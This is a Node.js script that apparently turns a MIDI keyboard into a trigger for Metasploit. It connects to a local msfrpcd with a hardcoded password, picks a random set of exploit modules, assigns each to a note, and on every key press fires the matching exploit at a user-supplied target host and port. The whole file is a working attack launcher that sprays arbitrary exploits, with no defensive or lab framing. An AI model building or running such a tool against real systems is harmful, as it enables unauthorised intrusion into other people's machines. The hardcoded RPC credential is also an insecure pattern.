const fs = require("fs").promises;
const JZZ = require('jzz');
const minimist = require('minimist');
const MsfRpc = require('msfrpc');

const uri = `http://${process.env.USER}:supersecret@127.0.0.1:55553`;
const msf = new MsfRpc(uri);

const info = JZZ().info();

if (process.env['DEBUG']) {
  console.log('Inputs:');
  info.inputs.forEach((input, index) => {
    console.log(`${index}: ${input.name}`);
  });
}

const args = minimist(process.argv.slice(2), {
  integer: ['start', 'length']  // not enforced, but helps doc
//  string: ['device', 'targetHost', 'targetPort', 'useList']
});

if (!args.start || !args.length || !args.device || !args.targetHost || !args.targetPort) {
  console.log('Usage: node index.js --start <MIDI note number> --length <number of exploits> --device "<MIDI device name>" --targetHost <target IP> --targetPort <target port> [--useList <file with list of exploits>]');
  console.log('Example: node index.js --start 60 --length 10 --device "USB MIDI Interface MIDI 1" --targetHost $TARGET_HOST --targetPort 80');
  process.exit(1);
}

const start = parseInt(args.start, 10);
const length = parseInt(args.length, 10);
const device = args.device;

if (!info.inputs.map((i) => { return i.name; }).includes(device)) {
  console.log(`Specified midi in device (${device}) not found, exiting`);
  process.exit(1);
}

if (process.env['DEBUG']) {
  console.log('Connecting to msfrpcd');
}

msf.connect()
  .then(() => { 
    if (process.env['DEBUG']) {
      console.log('Choosing exploits');
    }

    if (args.useList) {
      if (process.env['DEBUG']) {
        console.log(`Using exploit list from file: ${args.useList}`);
      }
      return fs.readFile(args.useList, 'utf8').then((results) => { return results.split('\n'); });
    } else {
      if (process.env['DEBUG']) {
        console.log('Generating exploit list');
      }
      return msf.module.search('type:exploit').then((results) => { return results.map((i) => { return i.fullname }); });
    }
  })
  .then((lines) => {
    const chosen = lines.sort(() => 0.5 - Math.random()).slice(0, length);
    if (process.env['DEBUG']) {
      console.log(`Chosen Exploits: \n${chosen.join(', \n')}\n`);
    }
    const exploitType = 'exploit';
    const j = JZZ()
      .openMidiIn(device)
      .or('Cannot open MIDI In!')
      .and(() => {
        if (process.env['DEBUG']) {
          console.log('Listening for MIDI...');
        }
      });
      
      j.connect((msg) => {
        chosen.forEach((value, idx) => {
          const exploitName = value;
          
          // Listen to all incoming MIDI messages
          const [status, note, velocity] = msg;

          // Check if it's a Note On (0x90–0x9F) and velocity > 0
          if ((status & 0xf0) === 0x90 && velocity > 0) {
            if (note === (idx + start)) {
              if (process.env['DEBUG']) {
                console.log(`Note On received: note=${note}, velocity=${velocity}, exploit=${exploitName}`);
              }

              const opts = {
                RHOST: args.targetHost,
                RPORT: args.targetPort,
              }

              msf.module.execute(exploitType, exploitName, opts);
            }
          }
        });
    });
});
